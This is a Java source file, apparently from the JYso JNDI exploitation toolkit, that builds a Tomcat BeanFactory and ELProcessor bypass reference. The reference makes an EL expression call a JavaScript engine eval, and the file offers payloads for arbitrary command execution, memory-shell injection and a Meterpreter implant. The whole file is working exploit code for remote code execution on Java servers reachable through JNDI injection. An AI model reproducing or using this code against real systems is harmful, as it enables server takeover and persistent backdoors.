package com.qi4l.JYso.controllers.rmi;

import com.qi4l.JYso.controllers.BaseLdapController;
import com.qi4l.JYso.controllers.BaseLdapController.ParseResult;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.JYso.template.Meterpreter;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static com.qi4l.JYso.controllers.BaseLdapController.*;

public class ELProcessor {
    private static final String SCRIPT_TEMPLATE = "{\"\"}.getClass().forName(\"javax.script.ScriptEngineManager\")"
            + ".newInstance().getEngineByName(\"JavaScript\")"
            + ".eval(\"%s\")}";

    private static String     payloadType;
    private static String[]   params = new String[0];

    public static ResourceRef refTomcatBypass(String base) throws Exception {
        ParseResult result = parseBase(base, "- JNDI RMI Local Reference Links + ELProcessor");
        payloadType = result.payloadType;
        params = result.params;

        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null,
                "",
                "",
                true,
                "org.apache.naming.factory.BeanFactory",
                null
        );
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", buildPayloadScript()));
        return ref;
    }

    private static String buildPayloadScript() throws Exception {
        String scriptBody;
        if (payloadType.contains("E-")) {
            String simpleName = suffixAfterDash(payloadType);
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(simpleName));
            scriptBody = InjShell.injectClass(echoClass);
        } else if (payloadType.contains("M-")) {
            scriptBody = Gadgets.createClassT(suffixAfterDash(payloadType));
        } else if (payloadType.contains("command")) {
            if (params.length == 0) {
                throw new IncorrectParamsException("Missing command parameters.");
            }
            scriptBody = BaseLdapController.getExecCode(params[0]);
        } else if (payloadType.contains("msf")) {
            scriptBody = InjShell.injectClass(Meterpreter.class);
        } else {
            throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
        }

        return String.format(SCRIPT_TEMPLATE, scriptBody.replace("\"", "\\\""));
    }
}
